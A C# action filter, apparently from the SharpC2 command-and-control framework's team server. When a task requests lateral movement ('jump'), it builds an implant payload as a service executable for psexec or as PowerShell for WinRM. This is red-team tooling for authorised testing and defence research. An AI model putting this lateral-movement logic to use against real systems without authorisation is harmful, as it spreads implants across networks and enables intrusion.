using Microsoft.AspNetCore.Mvc.Filters;

using SharpC2.API.Request;

using TeamServer.Controllers;
using TeamServer.Handlers;
using TeamServer.Interfaces;

namespace TeamServer.Filters;

public sealed class JumpFilters  : IAsyncActionFilter
{
    private readonly IHandlerService _handlers;
    private readonly IPayloadService _payloads;

    public JumpFilters(IHandlerService handlers, IPayloadService payloads)
    {
        _handlers = handlers;
        _payloads = payloads;
    }

    public async Task OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next)
    {
        if (context.Controller is TasksController)
        {
            if (context.ActionArguments.TryGetValue("request", out var action))
            {
                if (action is DroneTaskRequest taskRequest)
                {
                    // jump
                    if (taskRequest.Command == 0x20)
                    {
                        // params[0] == method
                        // params[1] == target
                        // params[2] == handler
                        
                        // get handler
                        var handler = _handlers.GetHandler<Handler>(taskRequest.Arguments[2]);
                        
                        if (handler is null)
                            throw new ArgumentException("Handler not found");
                        
                        // payload format
                        var method = taskRequest.Arguments[0].ToLowerInvariant();
                        var format = method switch
                        {
                            "psexec" => PayloadFormat.ServiceExe,
                            "winrm" => PayloadFormat.PowerShell,
                            
                            _ => throw new ArgumentException("Invalid jump method")
                        };
                        
                        // generate payload
                        taskRequest.Artefact = await _payloads.GeneratePayload(handler, format);
                        
                        // remove handler name from task
                        taskRequest.Arguments = taskRequest.Arguments.SkipLast(1).ToArray();
                    }
                }
            }
        }

        // go to next
        await next();
    }
}